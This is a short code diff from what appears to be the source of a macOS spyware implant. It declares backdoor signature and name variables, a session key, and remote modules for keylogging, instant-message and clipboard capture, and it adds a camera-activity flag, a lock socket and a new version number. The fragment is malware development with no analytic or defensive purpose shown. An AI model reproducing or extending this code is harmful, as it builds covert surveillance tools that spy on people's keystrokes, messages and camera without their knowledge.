@@ -57,6 +57,7 @@ char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; // Dubai
 char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";
 
 BOOL gAgentCrisis   = NO;
+BOOL gCameraActive  = NO;
 
 NSString *gDylibName                = nil;
 NSString *gBackdoorName             = nil;
@@ -64,6 +65,7 @@ NSString *gBackdoorUpdateName       = nil;
 NSString *gConfigurationName        = nil;
 NSString *gConfigurationUpdateName  = nil;
 NSData   *gSessionKey               = nil;
+int       gLockSock                 = -1;
 
 // OS version
 u_int gOSMajor  = 0;
@@ -79,7 +81,7 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-u_int gVersion      = 2011112801;
+u_int gVersion      = 2012013102;
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
 {
